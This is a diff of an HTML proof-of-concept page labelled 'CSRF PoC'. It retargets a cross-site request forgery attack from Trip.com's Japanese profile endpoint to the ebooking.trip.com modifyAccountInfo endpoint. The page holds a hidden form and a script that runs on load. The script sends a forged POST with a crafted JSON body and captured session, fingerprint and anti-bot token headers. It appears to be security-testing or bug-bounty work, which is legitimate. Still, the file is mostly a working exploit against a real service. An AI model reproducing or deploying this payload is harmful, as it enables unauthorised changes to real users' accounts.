@@ -1,28 +1,78 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF PoC</title>
 </head>
 <body>
-    <form action="https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664" method="GET" id="csrfForm">
-        <input type="hidden" name="locale" value="ja-JP">
-        <input type="hidden" name="ThisUserInfo" value='{"cityNameResident":"","cityNameInterest":"","gender":"U","countryOrRegion":"","foreignNickName":"","cityIdResident":"","cityIdInterest":""}'>
-        <input type="hidden" name="head" value='{"cid":"09034039319202464984","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"ja-JP","Language":"jp","Currency":"INR","ClientID":"09034039319202464984"}'>
+    <form action="https://ebooking.trip.com/restapi/soa2/23515/modifyAccountInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781860744713-1290373" method="POST" id="csrfForm">
+        <textarea name="reqHead" style="display:none;">{"host":"ebooking.trip.com","pathName":"/user/setting","locale":"en-US","release":"","client":{"deviceType":"PC","os":"Windows","osVersion":"Windows 10","deviceName":"Windows PC","clientId":"09034039319202464984","screenWidth":1536,"screenHeight":864,"isIn":{"ie":false,"chrome":true,"chrome49":false,"wechat":false,"firefox":false,"ios":false,"android":false},"isModernBrowser":true,"browser":"Chrome","browserVersion":"149","platform":"pc","technology":"web"},"ubt":{"pageid":"10650079632","pvid":12,"sid":11,"vid":"1781601012940.d6282vo5V7sr","fp":"A5E79A-14D6EA-E6BFCA","rmsToken":"fp=A5E79A-14D6EA-E6BFCA&vid=1781601012940.d6282vo5V7sr&pageId=10650071865&r=15c322cf117b4772a835807aaf3f998d&ip=undefined&rg=b4&kpData=0_0_0&kpControl=0_0_0-0_0_0&kpEmp=0_0_0_0_0_0_0_0_0_0-0_0_0_0_0_0_0_0_0_0-0_0_0_0_0_0_0_0_0_0&screen=1536x864&tz=+5.5&blang=en-US&oslang=en-US&ua=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Safari%2F537.36&d=ebooking.trip.com&v=25&kpg=0_0_0_0_0_0_0_0_0_0&adblock=F&cck=F&ftoken="},"gps":{"coord":"","lat":"","lng":"","cid":0,"cnm":""},"protocal":"https:"},"department":"test","head":{"cid":"09034039319202464984","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"en-US","Language":"en","Currency":"INR","ClientID":"09034039319202464984"}}</textarea>
     </form>
     <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://ebooking.trip.com/restapi/soa2/23515/modifyAccountInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781860744713-1290373", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.setRequestHeader("x-ctx-Locale", "en-US");
+        xhr.setRequestHeader("x-ctx-Currency", "INR");
+        xhr.setRequestHeader("x-ctx-ubt-pvid", "12");
+        xhr.setRequestHeader("x-ctx-ubt-vid", "1781601012940.d6282vo5V7sr");
+        xhr.setRequestHeader("spidertoken", "1006-common-ot8W7TK77IpNJaqIq9RfLEkoWgPYqAElXyDqydOjm4J4sRA5R9GxXnJbawHZjm6JbzE3PxUOEd3Ja7JMFvNojfFw9FvzgJlcEsaRZAWs7yl4RdQE17rgYHfYs0wDnRcfRdQyG0jO8Ramjtgwz7WqZya5EXBE67wM6v7OYPhe64y1BWMYaswA9r5BrcAKSzjqGjF6ElOyaEDsimhYbEL6YSoytEogYOByc3jdhJXTionik1rZTeH5YoNxloILZjU5wpOeNOEmzI10whBi4bRNEq8YSkyqkvt3yb3j3owzEzUYNkyfbyk4j60jsZjt3eFLYtMxTEzQihpyH0RDtesPwOLwUFihgK6dv5QR0ME1EMdi7qJm4jDOwcovTkjOyz1jPBENYGXWmTjUOw0SRSgy0hj94RTBw0fWM9RnQWSDRAtYmGvaFETlW4XI8qyTMw7BYMFj9UYqfx6fidDJ74jnsyLByBqwMqx9MegSYbYzhrz5rb4K0TEAgy75yq4i9qjDLWklEHkJgOeU6YftjsXjmGwFDe6QE79EMzENGybsefME5HRG1j91vZMeTPEnpEXfJ6nWb1w4FRFcwFnifZwgfio5WSNRl3JZcYtBesYmNibMWfFWB7j0qwHFYAQw1nwdZEFqYsgwFbylDjsbrFYzbwhbJ5kvocis3YnhJT7yL8vcYUfxBpRO5izfvTQe5MYOTibqYMSYADekcKcYhPxlBR76YFfebZiSmi79WpAxzPIm4vqYbSYqnyfoJkzjg4YN4e6MyZ7Jn5wnqEXqYfYa9Kg9R1kYhpRomJdFi4GwLXe9zj4MwafEb1rMFi55KGYpOIgTYnpKb3RGhJQDi0cwNUep9j96RNmw6TvclY5pKXYFZJQHyNQRt9iGaEQLynPxgdxF3WGYZfxgAihsxTcYD9i9Pw7hRfkE7SWs0rSTxfoRDY9TKTbxqoIbXJfQElvShJgYT5imqvPNyM5jz9w1ZvGBjmURXE7NWHYM5jqleHdE3FY4tE9nvMMx4YNPIL5JbhYgdjqkwszvDFjaaxcNEqGKtYksxAoYMPRFQRA9WZSWhDwmpw7zvHYcmEPbjmgxL0Y18wPtvlYkOi5w4lj0ZRqOWbSwtnJzPW9dW17yqzv16wb1i3FYg9I7Fw9Sw3YHGxsPJTjLnyOmyAsJ1meB1w6pvTDJqAJ3ovsQe9Y0fRZDWODRQ0RUBJnlibzw0fepPj7HRfHwZJL0RMT");
+        xhr.setRequestHeader("x-ctx-wclient-req", "8e6540a239d0acf457af68dbe245c412");
+        xhr.setRequestHeader("x-ctx-ubt-sid", "11");
+        xhr.setRequestHeader("currency", "INR");
+        xhr.setRequestHeader("w-payload-source", "1.0.9@102!T/CCOSk/GVKbKSVnOrASGrOVG64/GrCdGrOH+rKp9lqR+rb2OE9P9rqbOrK2+ET5+rApbbbpOSkp+EG5OStLOSALbEqDOtbpbEbIKEKLKEKIKSAIKlbnOEGL+rkLbEAZ+EA2KEA5Kr4IOEbD9EGn+Ej2wSF6OZOnbb==");
+        xhr.setRequestHeader("x-ctx-ubt-pageid", "10650079632");
+        xhr.setRequestHeader("Origin", "https://ebooking.trip.com");
+        xhr.setRequestHeader("Referer", "https://ebooking.trip.com/user/setting?microJump=true");
+        
         var payload = {
-            "locale": "ja-JP",
-            "ThisUserInfo": {
-                "cityNameResident": "",
-                "cityNameInterest": "",
-                "gender": "U",
-                "countryOrRegion": "",
-                "foreignNickName": "",
-                "cityIdResident": "",
-                "cityIdInterest": ""
+            "reqHead": {
+                "host": "ebooking.trip.com",
+                "pathName": "/user/setting",
+                "locale": "en-US",
+                "release": "",
+                "client": {
+                    "deviceType": "PC",
+                    "os": "Windows",
+                    "osVersion": "Windows 10",
+                    "deviceName": "Windows PC",
+                    "clientId": "09034039319202464984",
+                    "screenWidth": 1536,
+                    "screenHeight": 864,
+                    "isIn": {
+                        "ie": false,
+                        "chrome": true,
+                        "chrome49": false,
+                        "wechat": false,
+                        "firefox": false,
+                        "ios": false,
+                        "android": false
+                    },
+                    "isModernBrowser": true,
+                    "browser": "Chrome",
+                    "browserVersion": "149",
+                    "platform": "pc",
+                    "technology": "web"
+                },
+                "ubt": {
+                    "pageid": "10650079632",
+                    "pvid": 12,
+                    "sid": 11,
+                    "vid": "1781601012940.d6282vo5V7sr",
+                    "fp": "A5E79A-14D6EA-E6BFCA",
+                    "rmsToken": "fp=A5E79A-14D6EA-E6BFCA&vid=1781601012940.d6282vo5V7sr&pageId=10650071865&r=15c322cf117b4772a835807aaf3f998d&ip=undefined&rg=b4&kpData=0_0_0&kpControl=0_0_0-0_0_0&kpEmp=0_0_0_0_0_0_0_0_0_0-0_0_0_0_0_0_0_0_0_0&screen=1536x864&tz=+5.5&blang=en-US&oslang=en-US&ua=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Safari%2F537.36&d=ebooking.trip.com&v=25&kpg=0_0_0_0_0_0_0_0_0_0&adblock=F&cck=F&ftoken="
+                },
+                "gps": {
+                    "coord": "",
+                    "lat": "",
+                    "lng": "",
+                    "cid": 0,
+                    "cnm": ""
+                },
+                "protocal": "https:"
             },
+            "department": "test",
             "head": {
                 "cid": "09034039319202464984",
                 "ctok": "",
@@ -33,37 +83,14 @@
                 "auth": "",
                 "xsid": "",
                 "extension": [],
-                "Locale": "ja-JP",
-                "Language": "jp",
+                "Locale": "en-US",
+                "Language": "en",
                 "Currency": "INR",
                 "ClientID": "09034039319202464984"
             }
         };
-
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("GET", "https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664", true);
-        xhttp.setRequestHeader("Content-Type", "application/json");
-        xhttp.setRequestHeader("x-ctx-Locale", "ja-JP");
-        xhttp.setRequestHeader("x-ctx-Currency", "INR");
-        xhttp.setRequestHeader("x-ctx-ubt-pvid", "7");
-        xhttp.setRequestHeader("x-ctx-ubt-vid", "1781601012940.d6282vo5V7sr");
-        xhttp.setRequestHeader("x-ctx-wclient-req", "c297e64aa52861c325c7f18d8a9800ef");
-        xhttp.setRequestHeader("x-ctx-ubt-sid", "8");
-        xhttp.setRequestHeader("x-ctx-Country", "JP");
-        xhttp.setRequestHeader("w-payload-source", "1.0.9@102!h/hZYBhNFLLb+rk/K6GSOETpGlCdOE4RKETSGSOHKSbZKrVnKXK2KrKbOrK2+ET5+rApbbbpOSkpOSTRKE4IOSqnbEqDOtbpbEbIKEKLKEKIKSAIKlbnOEGL+rkLbEAZ+EA2KEA5Kr4IOEbD9EGn+Ej2wSF6OZOnbb==");
-        xhttp.setRequestHeader("x-ctx-ubt-pageid", "10650138482");
-        xhttp.setRequestHeader("Origin", "https://jp.trip.com");
-        xhttp.setRequestHeader("Referer", "https://jp.trip.com/membersinfo/profile?locale=ja-JP&curr=INR");
-
-        xhttp.onreadystatechange = function() {
-            if (this.readyState === 4 && this.status === 200) {
-                console.log(this.responseText);
-            } else if (this.readyState === 4) {
-                console.error("Error: " + this.status);
-            }
-        };
-
-        xhttp.send(JSON.stringify(payload));
+        
+        xhr.send(JSON.stringify(payload));
     </script>
 </body>
 </html>
